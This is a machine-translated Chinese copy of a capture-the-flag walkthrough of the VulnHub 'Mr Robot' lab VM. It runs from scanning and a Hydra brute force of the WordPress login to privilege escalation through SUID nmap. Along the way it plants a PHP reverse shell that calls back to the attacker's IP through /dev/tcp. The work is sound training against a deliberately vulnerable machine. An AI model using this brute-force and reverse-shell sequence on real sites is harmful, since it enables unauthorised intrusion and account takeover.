<html>
<head>
<title>VulnHub: Mr Robot</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">机器人先生</h1>
<blockquote>原文：<a href="https://medium.com/geekculture/vulnhub-mr-robot-35eac3078d5c?source=collection_archive---------2-----------------------#2022-04-30">https://medium.com/geekculture/vulnhub-mr-robot-35eac3078d5c?source=collection_archive---------2-----------------------#2022-04-30</a></blockquote><div><div class="ds gw gx gy gz ha"/><div class="hb hc hd he hf"><div class=""/><figure class="ev ex ig ih ii ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es if"><img src="../Images/e8686190949586c039773815190313cf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*gvtIPY8Wi6j3Dk3N"/></div></div><figcaption class="iq ir et er es is it bd b be z dx">Mr Robot — VulnHub Header</figcaption></figure><p id="4fe9" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">亲爱的朋友，感谢你来到<a class="ae js" href="https://haxez.org" rel="noopener ugc nofollow" target="_blank">哈克斯</a>。我喜欢《机器人先生》,这可能是我最喜欢的节目之一(和《X档案》和《豪斯医生》一样)。这不仅是一部现实的黑客剧，也是一部心理惊悚片，有一些疯狂的时刻。所以，今天我们要引导我们内心的黑客行动主义者，并与fsociety联合起来，打倒邪恶集团这个全球企业集团。没错，我们要黑进莱昂·约翰逊在VulnHub上创造的机器人先生盒子。</p><h1 id="dd2a" class="jt ju hi bd jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq bi translated">机器人先生成立了</h1><p id="3c3a" class="pw-post-body-paragraph iu iv hi iw b ix kr iz ja jb ks jd je jf kt jh ji jj ku jl jm jn kv jp jq jr hb bi translated">为了破解这个盒子，你首先需要从<a class="ae js" href="https://www.vulnhub.com/entry/mr-robot-1,151/" rel="noopener ugc nofollow" target="_blank"> VulnHub </a>下载它。下载完产品后，您需要将其导入到虚拟机管理程序软件中。我将使用VirtualBox来完成这项工作，操作非常简单，只需点击“文件&gt;导入设备”,然后导航到您下载的文件。这可能需要几分钟，但一旦完成，启动你的黑客虚拟机。</p><figure class="kx ky kz la fd ij er es paragraph-image"><div class="er es kw"><img src="../Images/b8547d7678055ab20308b9a927a6d383.png" data-original-src="https://miro.medium.com/v2/resize:fit:1360/0*lCeE7fkurFVtXHeW"/></div><figcaption class="iq ir et er es is it bd b be z dx">VirtualBox Mr Robot Set Up</figcaption></figure><h1 id="a660" class="jt ju hi bd jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq bi translated">VirtualBox网络设置</h1><p id="68a0" class="pw-post-body-paragraph iu iv hi iw b ix kr iz ja jb ks jd je jf kt jh ji jj ku jl jm jn kv jp jq jr hb bi translated">首先，您需要检查您的主机网络管理器设置。这可以在VirtualBox中通过“文件&gt;主机网络管理器”来完成。查看一下您的网络设置，记下IPv4地址。</p><figure class="kx ky kz la fd ij er es paragraph-image"><div class="er es kw"><img src="../Images/873365681b6e251dcb584c04474d73bc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1360/0*qW4RqRAG6EB_NFNC"/></div><figcaption class="iq ir et er es is it bd b be z dx">VirtualBox Network Set Up</figcaption></figure><p id="e3d8" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">获得主机网络地址后，检查DHCP是否已启用。然后，进入你的黑客机器和你的目标机器的网络设置。检查两台机器是否都将适配器1设置为仅主机，以及适配器的名称是否相同。如果你愿意，你可以在Kali上启用第二个适配器，并将其设置为NAT，这样你仍然可以访问互联网。</p><figure class="kx ky kz la fd ij er es paragraph-image"><div class="er es lb"><img src="../Images/5173afacac009905bfb13f1f3d65725c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1352/0*pIiiA2QXJNVfcEUW"/></div><figcaption class="iq ir et er es is it bd b be z dx">VirtualBox Host Network Set Up</figcaption></figure><h1 id="66b4" class="jt ju hi bd jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq bi translated">寻找机器人先生</h1><p id="ad2e" class="pw-post-body-paragraph iu iv hi iw b ix kr iz ja jb ks jd je jf kt jh ji jj ku jl jm jn kv jp jq jr hb bi translated">希望找到机器人先生不会太难，因为我们已经正确配置了网络设置。首先，你可以使用名为netdiscover的工具，它可以被动地检测在线主机，也可以通过发送ARP请求来搜索它们。这可能很吵，但我认为这是值得一提的。我们知道仅主机接口的IP地址是192.168.56.0，所以让netdiscover来探索一下这个范围。</p><h1 id="d09f" class="jt ju hi bd jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq bi translated">网络发现</h1><pre class="kx ky kz la fd lc ld le lf aw lg bi"><span id="29b7" class="lh ju hi ld b fi li lj l lk ll">sudo netdiscover -r 192.168.56.0/24<br/>Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                                                                                                                                       3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                                                                                                             _____________________________________________________________________________<br/>IP            At MAC Address     Count     Len  MAC Vendor / Hostname      <br/>-----------------------------------------------------------------------------<br/>192.168.56.1    0a:00:27:00:00:0b      1      60  Unknown vendor                                                                                                                           <br/>192.168.56.100  08:00:27:71:14:50      1      60  PCS Systemtechnik GmbH                                                                                                                   192.168.56.101  08:00:27:db:36:79      1      60  PCS Systemtechnik GmbH</span></pre><p id="cd07" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">如您所见，有三个主机响应。一个是IP地址为192.168.56.1的默认网关，一个是我们自己的机器，另一个是目标机器。我们一会儿就要弄清楚哪个是哪个。</p><h1 id="cd2d" class="jt ju hi bd jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq bi translated">Ping扫描</h1><p id="f023" class="pw-post-body-paragraph iu iv hi iw b ix kr iz ja jb ks jd je jf kt jh ji jj ku jl jm jn kv jp jq jr hb bi translated">我们查找主机的第二种方法是对网络执行ping扫描。从下面的终端输出可以看出，它找到了相同的主机。所以我们现在知道目标主机是192.168.56.100或192.168..56.101.让我们执行一些侦察来找出哪个是哪个。</p><pre class="kx ky kz la fd lc ld le lf aw lg bi"><span id="2a8c" class="lh ju hi ld b fi li lj l lk ll">┌──(kali㉿kali)-[~]<br/>└─$ sudo nmap -sP 192.168.56.0/24<br/>[sudo] password for kali: <br/>Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-30 07:39 EDT<br/>Nmap scan report for 192.168.56.1<br/>Host is up (0.00015s latency).<br/>MAC Address: 0A:00:27:00:00:0B (Unknown)<br/>Nmap scan report for 192.168.56.100<br/>Host is up (0.00036s latency).<br/>MAC Address: 08:00:27:71:14:50 (Oracle VirtualBox virtual NIC)<br/>Nmap scan report for 192.168.56.101<br/>Host is up (0.00038s latency).<br/>MAC Address: 08:00:27:DB:36:79 (Oracle VirtualBox virtual NIC)<br/>Nmap done: 256 IP addresses (4 hosts up) scanned in 28.02 seconds</span></pre><h1 id="e9e6" class="jt ju hi bd jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq bi translated">机器人侦察先生</h1><p id="aa08" class="pw-post-body-paragraph iu iv hi iw b ix kr iz ja jb ks jd je jf kt jh ji jj ku jl jm jn kv jp jq jr hb bi translated">为了找出我们的目标是哪一个，我们可以对两个IP地址进行端口扫描。监听IP地址的服务应该会告诉我们需要攻击哪一个。我在下面的扫描中所做的就是对所有端口运行TCP扫描。这通常是相当快，应该给我们所需要的一切。我们可以做更复杂的扫描，但是现在，让我们弄清楚哪个盒子是哪个。</p><pre class="kx ky kz la fd lc ld le lf aw lg bi"><span id="b073" class="lh ju hi ld b fi li lj l lk ll">┌──(kali㉿kali)-[/media/sf_OneDrive/VulnHub/MrRobot/Tooloutput]<br/>└─$ sudo nmap -sT -p0- 192.168.56.100 <br/>Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-30 08:00 EDT<br/>Nmap scan report for 192.168.56.100<br/>Host is up (0.00012s latency).<br/>All 65536 scanned ports on 192.168.56.100 are in ignored states.<br/>Not shown: 65536 filtered tcp ports (proto-unreach)<br/>MAC Address: 08:00:27:71:14:50 (Oracle VirtualBox virtual NIC)<br/>Nmap done: 1 IP address (1 host up) scanned in 15.35 seconds</span></pre><p id="ba81" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">这里没什么事情。这可能是我的机器，因为不会有很多服务运行。</p><pre class="kx ky kz la fd lc ld le lf aw lg bi"><span id="e5c5" class="lh ju hi ld b fi li lj l lk ll">┌──(kali㉿kali)-[/media/sf_OneDrive/VulnHub/MrRobot/Tooloutput]<br/>└─$ sudo nmap -sT -p0- 192.168.56.101<br/>Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-30 08:01 EDT<br/>Nmap scan report for 192.168.56.101<br/>Host is up (0.0014s latency).<br/>Not shown: 65533 filtered tcp ports (no-response)<br/>PORT    STATE  SERVICE<br/>22/tcp  closed ssh<br/>80/tcp  open   http<br/>443/tcp open   https<br/>MAC Address: 08:00:27:DB:36:79 (Oracle VirtualBox virtual NIC)<br/>Nmap done: 1 IP address (1 host up) scanned in 125.66 seconds</span></pre><p id="e2a1" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">因为我们有一个关闭的SSH端口和一个监听端口80和443的web服务器。那肯定不是我的机器，很可能是我们的目标。</p><h1 id="851c" class="jt ju hi bd jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq bi translated">探索Web服务器</h1><p id="0de3" class="pw-post-body-paragraph iu iv hi iw b ix kr iz ja jb ks jd je jf kt jh ji jj ku jl jm jn kv jp jq jr hb bi translated">我们知道端口80和443是打开的，所以让我们在浏览器中检查一下。只需获取IP地址，并在浏览器中弹出，以HTTP://或HTTPS://开头。该网站模拟了一个带有许多选项的Linux终端。浏览这些选项似乎并没有给我们带来太多，但是对于沉浸感来说还是很酷的。我建议浏览一下。</p><figure class="kx ky kz la fd ij er es paragraph-image"><div class="er es kw"><img src="../Images/88723ca3bcc0a65bead439931a08e6c9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1360/0*rSRJt2jJfIHxF6hZ"/></div><figcaption class="iq ir et er es is it bd b be z dx">Mr Robot Web Server</figcaption></figure><h1 id="d277" class="jt ju hi bd jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq bi translated">破坏目录</h1><p id="52f8" class="pw-post-body-paragraph iu iv hi iw b ix kr iz ja jb ks jd je jf kt jh ji jj ku jl jm jn kv jp jq jr hb bi translated">由于该网站没有给我们提供太多可以用来进步的东西，现在是时候强行打开它的目录和文件，看看我们能找到什么有趣的东西。有很多工具可以做到这一点，但我将保持简单，使用dirb。dirb的输出非常重要，所以我在这里只包括一小部分。</p><pre class="kx ky kz la fd lc ld le lf aw lg bi"><span id="5fda" class="lh ju hi ld b fi li lj l lk ll">┌──(kali㉿kali)-[/media/sf_OneDrive/VulnHub/MrRobot/Tooloutput]<br/>└─$ sudo dirb https://192.168.56.101                     <br/>-----------------<br/>DIRB v2.22    <br/>By The Dark Raver<br/>-----------------<br/>START_TIME: Sat Apr 30 08:23:20 2022<br/>URL_BASE: https://192.168.56.101/<br/>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br/>-----------------<br/>GENERATED WORDS: 4612                                                          <br/>---- Scanning URL: https://192.168.56.101/ ----<br/>+ https://192.168.56.101/robots.txt (CODE:200|SIZE:41)<br/>==&gt; DIRECTORY: https://192.168.56.101/0/                                                                                                                                                                                                                                                                                                                                            ==&gt; DIRECTORY: https://192.168.56.101/admin/                                                                                                                                                                                                                                                                                                                                      ==&gt; DIRECTORY: https://192.168.56.101/audio/                                                                                                                                                                                                                                                                                                                                         ==&gt; DIRECTORY: https://192.168.56.101/blog/                                                                                                                                                                                                                                                                                                                                           ==&gt; DIRECTORY: https://192.168.56.101/css/                                                                                                                                                                                                                                                                                                                                             ==&gt; DIRECTORY: https://192.168.56.101/feed/<br/>==&gt; DIRECTORY: https://192.168.56.101/wp-admin/<br/>==&gt; DIRECTORY: <a class="ae js" href="https://192.168.56.101/wp-admin/" rel="noopener ugc nofollow" target="_blank">https://192.168.56.101/wp-admin/</a></span></pre><h1 id="a3ed" class="jt ju hi bd jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq bi translated">机器人先生. txt</h1><p id="6162" class="pw-post-body-paragraph iu iv hi iw b ix kr iz ja jb ks jd je jf kt jh ji jj ku jl jm jn kv jp jq jr hb bi translated">从上面的输出可以看出，我们有许多有趣的文件和目录。我要查看的第一个文件是robots.txt文件。本质上，robots.txt文件是一个告诉搜索引擎不要索引什么的文件。如果你的网站上有登录页面，那么你应该将它们包含在robots.txt文件中，以确保它们不会被搜索引擎索引。在<a class="ae js" href="http://192.168.56.101/robots.txt" rel="noopener ugc nofollow" target="_blank">http://192 . 168 . 56 . 101/robots . txt</a>来看看吧</p><pre class="kx ky kz la fd lc ld le lf aw lg bi"><span id="4e52" class="lh ju hi ld b fi li lj l lk ll">User-agent: *<br/>fsocity.dic<br/>key-1-of-3.txt</span></pre><h1 id="b3f8" class="jt ju hi bd jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq bi translated">第一个键</h1><p id="a2f4" class="pw-post-body-paragraph iu iv hi iw b ix kr iz ja jb ks jd je jf kt jh ji jj ku jl jm jn kv jp jq jr hb bi translated">看起来我们有了第一面旗子或钥匙。导航到<a class="ae js" href="http://192.168.56.101/key-1-of-3.txt" rel="noopener ugc nofollow" target="_blank">http://192 . 168 . 56 . 101/key-1-of-3 . txt</a>文件，您应该会收到以下密钥073403 c8 a 58 a1 f 80d 943455 FB 30724 b 9。我们似乎还有一个字典文件，也许是一个单词表，我们可以用它来尝试访问机器。让我们来看看<a class="ae js" href="http://192.168.56.101/fsocity.dic." rel="noopener ugc nofollow" target="_blank">http://192 . 168 . 56 . 101/fsocity . DIC .</a>文件会自动下载，但你可以在下载后再下载。</p><figure class="kx ky kz la fd ij er es paragraph-image"><div class="er es kw"><img src="../Images/33dbb98cf42bfc61cb884ca2918342ec.png" data-original-src="https://miro.medium.com/v2/resize:fit:1360/0*O304t9st_IoAc2rK"/></div><figcaption class="iq ir et er es is it bd b be z dx">Mr Robot Wordlist</figcaption></figure><h1 id="b429" class="jt ju hi bd jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq bi translated">管理区</h1><p id="06b6" class="pw-post-body-paragraph iu iv hi iw b ix kr iz ja jb ks jd je jf kt jh ji jj ku jl jm jn kv jp jq jr hb bi translated">我的怀疑是正确的，这是一个很大的单词表。我们可以试着用它或者网站的管理区来暴力破解SSH。既然我们在网站上找到了它，我想我们应该从那里开始。dirb找到的第一个管理区域是<a class="ae js" href="https://192.168.56.101/admin" rel="noopener ugc nofollow" target="_blank">https://192 . 168 . 56 . 101/admin</a>，但是访问它有一个持续的重定向循环。然而，它也发现了一个WordPress管理区。</p><figure class="kx ky kz la fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es kw"><img src="../Images/cf80208626eb7873016b321f864a3372.png" data-original-src="https://miro.medium.com/v2/resize:fit:1360/0*nwA0U0KB3sFcjlGX"/></div></div><figcaption class="iq ir et er es is it bd b be z dx">Mr Robot Wordpress Login</figcaption></figure><h1 id="9a25" class="jt ju hi bd jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq bi translated">枚举有效用户</h1><p id="3e52" class="pw-post-body-paragraph iu iv hi iw b ix kr iz ja jb ks jd je jf kt jh ji jj ku jl jm jn kv jp jq jr hb bi translated">有趣的是，当试图用admin: admin登录门户时，我被告知我使用了一个无效的用户名。这是web应用程序渗透测试中枚举用户的常用策略。如果提交不正确的用户名和带有不正确密码的正确用户名的错误消息不同，那么我们可以枚举正确的用户。首先，让我们整理单词列表，使其只包含唯一的条目。</p><pre class="kx ky kz la fd lc ld le lf aw lg bi"><span id="237d" class="lh ju hi ld b fi li lj l lk ll">┌──(kali㉿kali)-[/media/sf_OneDrive/VulnHub/MrRobot/Tooloutput]<br/>└─$ sort /home/kali/Downloads/fsocity.dic | uniq &gt; robodic.txt</span></pre><h1 id="6219" class="jt ju hi bd jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq bi translated">打嗝组曲</h1><p id="9765" class="pw-post-body-paragraph iu iv hi iw b ix kr iz ja jb ks jd je jf kt jh ji jj ku jl jm jn kv jp jq jr hb bi translated">有许多不同的工具能够暴力破解web应用程序，而Burp Suite对于这项任务来说可能有点大材小用。然而，我知道如何使用打嗝，并发现它真的很直观，所以我会坚持我所知道的。打开代理后，我将捕获一个登录请求并发送给入侵者。在那里，我将清除现有的头寸，并将我自己的头寸添加到log参数中。</p><figure class="kx ky kz la fd ij er es paragraph-image"><div class="er es kw"><img src="../Images/782810673e3ba948c8ab8db8d9e60a37.png" data-original-src="https://miro.medium.com/v2/resize:fit:1360/0*T9Cp3NgajrP20uIz"/></div><figcaption class="iq ir et er es is it bd b be z dx">Burp Suite</figcaption></figure><p id="6006" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">然后，我会将fsociety.dic文件加载到有效负载中，并在几分钟内开始攻击。我们可以看到，用户Elliot的响应长度与其他响应不同。这表明被发回的错误消息与其他用户的不同。</p><figure class="kx ky kz la fd ij er es paragraph-image"><div class="er es kw"><img src="../Images/f6cec33b2c43641d6fc7fd0712468e9c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1360/0*dTdHxCVVE4YWTj8t"/></div><figcaption class="iq ir et er es is it bd b be z dx">Burp Suite Intruder</figcaption></figure><p id="e9e9" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">很快，我们可以看到用户Elliot的响应长度与其他响应不同。这表明被发回的错误消息与其他用户的不同。</p><h1 id="8e69" class="jt ju hi bd jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq bi translated">水螅</h1><p id="9ba3" class="pw-post-body-paragraph iu iv hi iw b ix kr iz ja jb ks jd je jf kt jh ji jj ku jl jm jn kv jp jq jr hb bi translated">错误消息是不同的，如您所见，它指出用户Elliot的密码不正确。现在我们知道了用户名，是时候找到我们的密码了，为此，我们将使用另一个名为Hydra的工具。</p><pre class="kx ky kz la fd lc ld le lf aw lg bi"><span id="f644" class="lh ju hi ld b fi li lj l lk ll">hydra -vV -l elliot -P robotdic.txt 192.168.56.101 http-post-form '/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:F=is incorrect'<br/>[ATTEMPT] target 192.168.56.101 - login "elliot" - pass "even" - 5656 of 11452 [child 9] <br/>[ATTEMPT] target 192.168.56.101 - login "elliot" - pass "Even" - 5657 of 11452 [child 7] <br/>[ATTEMPT] target 192.168.56.101 - login "elliot" - pass "evening" - 5658 of 11452 [child 11] <br/>[ATTEMPT] target 192.168.56.101 - login "elliot" - pass "event" - 5659 of 11452 [child 12] <br/>[ATTEMPT] target 192.168.56.101 - login "elliot" - pass "events" - 5660 of 11452 [child 5] <br/>[80][http-post-form] host: 192.168.56.101   login: elliot   password: ER28-0652<br/>STATUS] attack finished for 192.168.56.101 (waiting for children to complete tests)<br/>1 of 1 target successfully completed, 1 valid password found<br/>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-04-30 09:58:12</span></pre><p id="f752" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">答对了，我们从fsociety.dic文件中找到了他的密码。</p><h1 id="0b1c" class="jt ju hi bd jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq bi translated">弹壳</h1><p id="8856" class="pw-post-body-paragraph iu iv hi iw b ix kr iz ja jb ks jd je jf kt jh ji jj ku jl jm jn kv jp jq jr hb bi translated">现在我们需要打开盒子，最简单的方法是在WordPress模板中添加一些代码。最简单的可能是404模板，因为您可以调用任何不存在的页面来执行代码。用你自己的IP地址修改下面的代码，并把它添加到WordPress 404模板的顶部。</p><pre class="kx ky kz la fd lc ld le lf aw lg bi"><span id="7b63" class="lh ju hi ld b fi li lj l lk ll">&lt;?php<br/>exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.56.102/443 0&gt;&amp;1'");<br/>?&gt;</span></pre><figure class="kx ky kz la fd ij er es paragraph-image"><div class="er es kw"><img src="../Images/958c4d3e2595df3b3720e6cff1894dc2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1360/0*cPqanzhUOFasuS2r"/></div><figcaption class="iq ir et er es is it bd b be z dx">Wordpress 404 Template</figcaption></figure><p id="d4a8" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">现在，在您的终端中，使用NetCat在端口443上创建一个监听器。</p><pre class="kx ky kz la fd lc ld le lf aw lg bi"><span id="6c06" class="lh ju hi ld b fi li lj l lk ll">┌──(kali㉿kali)-[/media/sf_OneDrive/VulnHub/MrRobot/Tooloutput]<br/>└─$ sudo nc -lvp 443       <br/>listening on [any] 443 ...<br/>connect to [192.168.56.102] from (UNKNOWN) [192.168.56.101] 37398<br/>daemon@linux:/opt/bitnami/apps/wordpress/htdocs$ ls</span></pre><h1 id="891e" class="jt ju hi bd jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq bi translated">横向运动</h1><p id="4458" class="pw-post-body-paragraph iu iv hi iw b ix kr iz ja jb ks jd je jf kt jh ji jj ku jl jm jn kv jp jq jr hb bi translated">在主目录中，我们可以看到有一个名为“机器人”的用户。此外，在这个用户的主目录中有两个文件。一个是第二个密钥，另一个似乎是密码md5。不幸的是，由于权限问题，我们无法读取密钥文件，但我们可以读取密码文件。</p><pre class="kx ky kz la fd lc ld le lf aw lg bi"><span id="4383" class="lh ju hi ld b fi li lj l lk ll">daemon@linux:/opt/bitnami/apps/wordpress/htdocs$ ls -laSh /home/robot<br/>ls -laSh /home/robot<br/>total 16K<br/>drwxr-xr-x 2 root  root  4.0K Nov 13  2015 .<br/>drwxr-xr-x 3 root  root  4.0K Nov 13  2015 ..<br/>-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5<br/>-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt</span></pre><p id="f460" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">如果我们找到这个文件，我们可以看到它是用户机器人的md5散列。如果我们破解了这个散列，那么我们应该能够切换到机器人用户。</p><pre class="kx ky kz la fd lc ld le lf aw lg bi"><span id="28a5" class="lh ju hi ld b fi li lj l lk ll">daemon@linux:/opt/bitnami/apps/wordpress/htdocs$ cat /home/robot/password.raw-md5<br/>&lt;pps/wordpress/htdocs$ cat /home/robot/password.raw-md5                     <br/>robot:c3fcd3d76192e4007dfb496cca67e13b</span></pre><p id="3d71" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">现在，我们可以使用Hashcat或开膛手约翰来破解这个散列。然而，它可能已经被破解了，所以让我们看看crackstation.net。确实哈希已经被破解了，密码是abcdefghijklmnopqrstuvwxyz…对。</p><figure class="kx ky kz la fd ij er es paragraph-image"><div class="er es kw"><img src="../Images/0f559c5a8a11564396b706f53e50a09b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1360/0*TYmr6HQmlr3kQtMF"/></div><figcaption class="iq ir et er es is it bd b be z dx">Mr Robot Crackstation</figcaption></figure><h1 id="1d1e" class="jt ju hi bd jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq bi translated">TTY壳牌公司</h1><p id="35cf" class="pw-post-body-paragraph iu iv hi iw b ix kr iz ja jb ks jd je jf kt jh ji jj ku jl jm jn kv jp jq jr hb bi translated">在我们当前的shell中尝试切换到“robot”会产生一个错误，说我们需要在终端中。为了解决这个问题，我们需要生成一个TTY外壳。</p><pre class="kx ky kz la fd lc ld le lf aw lg bi"><span id="b69d" class="lh ju hi ld b fi li lj l lk ll">daemon@linux:/opt/bitnami/apps/wordpress/htdocs$ python -c 'import pty; pty.spawn("/bin/sh")'        <br/>$ su robot<br/>Password: abcdefghijklmnopqrstuvwxyz</span></pre><p id="af5b" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">现在我们已经切换到“机器人”,我们可以在我们的主目录中捕获密钥。</p><pre class="kx ky kz la fd lc ld le lf aw lg bi"><span id="452e" class="lh ju hi ld b fi li lj l lk ll">robot@linux:/opt/bitnami/apps/wordpress/htdocs$ cat /home/robot/key-2-of-3.txt           822c73956184f694993bede3eb39f959</span></pre><h1 id="013a" class="jt ju hi bd jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq bi translated">权限提升</h1><p id="f39c" class="pw-post-body-paragraph iu iv hi iw b ix kr iz ja jb ks jd je jf kt jh ji jj ku jl jm jn kv jp jq jr hb bi translated">为了将我们的特权提升到root，我们需要找到一个可以提升我们的程序。由于文件设置了suid位，这通常是可能的。您可以通过运行以下命令来查找设置了suid位的文件。</p><pre class="kx ky kz la fd lc ld le lf aw lg bi"><span id="0bbc" class="lh ju hi ld b fi li lj l lk ll">robot@linux:/opt/bitnami/apps/wordpress/htdocs$ find / -perm /4000 -type f 2&gt;/tmp/2                 <br/>/bin/ping<br/>/bin/umount<br/>/bin/mount<br/>/bin/ping6<br/>/bin/su<br/>/usr/bin/passwd<br/>/usr/bin/newgrp<br/>/usr/bin/chsh<br/>/usr/bin/chfn<br/>/usr/bin/gpasswd<br/>/usr/bin/sudo<br/>/usr/local/bin/nmapPrivilege Escalation</span></pre><p id="95e2" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">我们可以从输出中看到，其中一个文件是Nmap，旧版本的Nmap有一个交互模式，您可以使用该模式切换到root。正如您从下面的工具输出中看到的，我们可以使用Nmap交互模式转义到root并捕获最终密钥。</p><pre class="kx ky kz la fd lc ld le lf aw lg bi"><span id="6e80" class="lh ju hi ld b fi li lj l lk ll">robot@linux:~$ nmap –interactive<br/>nmap –interactive<br/>Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )<br/>Welcome to Interactive Mode -- press h &lt;enter&gt; for help<br/>nmap&gt; !sh<br/>!sh<br/># whoami<br/>Whoami<br/>root<br/># ls<br/>Ls<br/>key-2-of-3.txt  password.raw-md5<br/># cd /root<br/>cd /root<br/># ls<br/>Ls<br/>firstboot_done  key-3-of-3.txt<br/># cat key-3-of-3.txt<br/>cat key-3-of-3.txt<br/>04787ddef27c3dee1ee161b21670b4e4</span></pre><figure class="kx ky kz la fd ij"><div class="bz dy l di"><div class="lm ln l"/></div></figure></div></div>    
</body>
</html>